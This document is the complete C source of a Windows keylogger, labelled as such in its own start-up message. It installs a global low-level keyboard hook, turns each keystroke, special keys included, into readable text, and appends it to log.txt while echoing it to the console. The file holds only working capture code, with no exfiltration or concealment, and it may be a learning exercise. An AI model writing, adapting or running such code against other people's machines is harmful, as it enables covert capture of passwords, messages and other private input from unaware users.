#include <windows.h>
#include <stdio.h>

FILE *logFile;

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pkey->vkCode;

        // Handle special keys
        switch (vkCode) {
            case VK_BACK:
                printf("(BACKSPACE)");
                fprintf(logFile, "(BACKSPACE)");
                fflush(logFile);
                break;
            case VK_RETURN:
                printf("(ENTER)\n");
                fprintf(logFile, "(ENTER)\n");
                fflush(logFile);
                break;
            case VK_SPACE:
                printf("(SPACE)");
                fprintf(logFile, "(SPACE)");
                fflush(logFile);
                break;
            case VK_TAB:
                printf("(TAB)");
                fprintf(logFile, "(TAB)");
                fflush(logFile);
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
                printf("(LSHIFT)");
                fprintf(logFile, "(LSHIFT)");
                fflush(logFile);
                break;
            case VK_RSHIFT:
                printf("(RSHIFT)");
                fprintf(logFile, "(RSHIFT)");
                fflush(logFile);
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
                printf("(LCONTROL)");
                fprintf(logFile, "(LCONTROL)");
                fflush(logFile);
                break;
            case VK_RCONTROL:
                printf("(RCONTROL)");
                fprintf(logFile, "(RCONTROL)");
                fflush(logFile);
                break;
            case VK_MENU:
            case VK_LMENU:
                printf("(LALT)");
                fprintf(logFile, "(LALT)");
                fflush(logFile);
                break;
            case VK_RMENU:
                printf("(RALT)");
                fprintf(logFile, "(RALT)");
                fflush(logFile);
                break;
            case VK_ESCAPE:
                printf("(ESCAPE)");
                fprintf(logFile, "(ESCAPE)");
                fflush(logFile);
                break;
            case VK_LEFT:
                printf("(LEFT)");
                fprintf(logFile, "(LEFT)");
                fflush(logFile);
                break;
            case VK_RIGHT:
                printf("(RIGHT)");
                fprintf(logFile, "(RIGHT)");
                fflush(logFile);
                break;
            case VK_UP:
                printf("(UP)");
                fprintf(logFile, "(UP)");
                fflush(logFile);
                break;
            case VK_DOWN:
                printf("(DOWN)");
                fprintf(logFile, "(DOWN)");
                fflush(logFile);
                break;
            case VK_CAPITAL:
                printf("(CAPSLOCK)");
                fprintf(logFile, "(CAPSLOCK)");
                fflush(logFile);
                break;
            case VK_DELETE:
                printf("(DELETE)");
                fprintf(logFile, "(DELETE)");
                fflush(logFile);
                break;
            case VK_HOME:
                printf("(HOME)");
                fprintf(logFile, "(HOME)");
                fflush(logFile);
                break;
            case VK_END:
                printf("(END)");
                fprintf(logFile, "(END)");
                fflush(logFile);
                break;
            case VK_PRIOR:
                printf("(PAGEUP)");
                fprintf(logFile, "(PAGEUP)");
                fflush(logFile);
                break;
            case VK_NEXT:
                printf("(PAGEDOWN)");
                fprintf(logFile, "(PAGEDOWN)");
                fflush(logFile);
                break;
            case VK_INSERT:
                printf("(INSERT)");
                fprintf(logFile, "(INSERT)");
                fflush(logFile);
                break;
            case VK_F1: case VK_F2: case VK_F3: case VK_F4:
            case VK_F5: case VK_F6: case VK_F7: case VK_F8:
            case VK_F9: case VK_F10: case VK_F11: case VK_F12:
                printf("(F%d)", vkCode - VK_F1 + 1);
                fprintf(logFile, "(F%d)", vkCode - VK_F1 + 1);
                fflush(logFile);
                break;
            default:
                // For regular characters
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                WCHAR buffer[5];
                int result = ToUnicode(
                    vkCode,
                    pkey->scanCode,
                    keyboardState,
                    buffer,
                    4,
                    0
                );

                if (result > 0) {
                    wprintf(L"%lc", buffer[0]);
                    fwprintf(logFile, L"%lc", buffer[0]);
                    fflush(logFile);
                } else {
                    printf("(VK_%d)", vkCode);
                    fprintf(logFile, "(VK_%d)", vkCode);
                    fflush(logFile);
                }
                break;
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(void) {
    printf("Starting keylogger...\n");

    logFile = fopen("log.txt", "a");
    if (logFile == NULL) {
        printf("Error opening log file.\n");
        return 1;
    }

    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL) {
        printf("Failed to install hook.\n");
        fclose(logFile);
        return 1;
    }

    printf("Hook installed. Logging to console and log.txt\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    fclose(logFile);
    return 0;
}